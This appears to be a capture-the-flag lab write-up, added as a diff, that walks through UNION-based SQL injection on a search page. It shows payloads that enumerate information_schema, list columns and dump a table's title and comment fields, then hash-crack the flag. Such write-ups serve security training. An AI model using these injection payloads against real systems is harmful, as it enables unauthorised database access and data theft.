@@ -1,0 +1,35 @@
+We go to this page: http://10.12.248.13/?page=searchimg
+
+We run a query to find each table with their related database:
+1 OR 1=1 UNION SELECT table_schema,table_name FROM information_schema.columns;
+We find a useful piece of information:
+Title: list_images
+Url : Member_images
+
+We now know in which database the list_images table is stored. We then run a query to check what columns we have:
+1 OR 1=1 UNION SELECT table_name,column_name FROM information_schema.columns;
+
+We get:
+First name: list_images
+Surname : id
+
+First name: list_images
+Surname : url
+
+First name: list_images
+Surname : title
+
+First name: list_images
+Surname : comment
+
+We check all fields then end up finding what we need in title and comment. So we run this query:
+1 OR 1=1 UNION SELECT title,comment FROM Member_images.list_images;
+
+We get:
+First name: Hack me ?
+Surname : If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46
+
+Decrypted:
+albatroz
+
+We encrypt it in sha256 and we get the flag.
